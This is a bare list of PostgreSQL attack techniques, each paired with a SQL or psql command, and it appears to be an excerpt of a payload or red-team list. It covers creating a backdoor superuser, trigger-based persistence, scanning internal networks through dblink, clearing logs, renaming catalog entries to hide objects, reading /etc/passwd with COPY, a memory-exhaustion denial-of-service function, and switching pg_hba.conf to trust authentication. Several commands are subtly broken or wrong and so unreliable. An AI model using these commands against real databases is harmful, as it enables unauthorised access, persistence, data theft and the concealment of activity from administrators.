        Execute stored procedures with SECURITY DEFINER to gain elevated privileges: SELECT * FROM pg_proc WHERE prosecdef = 't'
        Create backdoor users with superuser privileges: CREATE USER backdoor WITH PASSWORD 'evil' SUPERUSER
        Establish persistence through trigger-based backdoors: CREATE TRIGGER evil_trigger BEFORE UPDATE ON target_table EXECUTE PROCEDURE malicious_function()
        Enable network listening for remote connections: ALTER SYSTEM SET listen_addresses = '*'; SELECT pg_reload_conf()
        Use psql to scan internal networks through dblink: SELECT dblink_connect('host=' || ip || ' user=postgres') FROM generate_series('192.168.1.1'::inet, '192.168.1.255'::inet) AS ip
        Clear database logs to hide malicious activity: TRUNCATE pg_log; SELECT pg_rotate_logfile()
        Create malicious views for privilege escalation: CREATE VIEW evil_view AS SELECT * FROM sensitive_table; GRANT ALL ON evil_view TO public
        Modify system catalogs to hide malicious objects: UPDATE pg_class SET relname = 'benign_name' WHERE relname = 'malicious_object'
        Use psql variables to execute dynamic SQL attacks: \set PAYLOAD 'SELECT * FROM users; DROP TABLE audit_logs;' \g :PAYLOAD
        Leverage foreign data wrappers for lateral movement: CREATE SERVER remote_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'target_host')
        Exploit COPY command for arbitrary file reading: COPY target_table FROM '/etc/passwd'
        Create event triggers to intercept and modify database operations: CREATE EVENT TRIGGER backdoor_trigger ON ddl_command_start EXECUTE PROCEDURE malicious_event_function()
        Dump database shared memory: SELECT * FROM pg_buffercache; SELECT * FROM pg_stat_activity
        Create memory-consuming functions to cause denial of service: CREATE FUNCTION memory_exhaust() RETURNS void AS $$ BEGIN WHILE true LOOP array_agg(generate_series(1,1000000)); END LOOP; END; $$ LANGUAGE plpgsql
        Manipulate authentication rules in pg_hba.conf: \! sed -i 's/md5/trust/g' pg_hba.conf; SELECT pg_reload_conf()
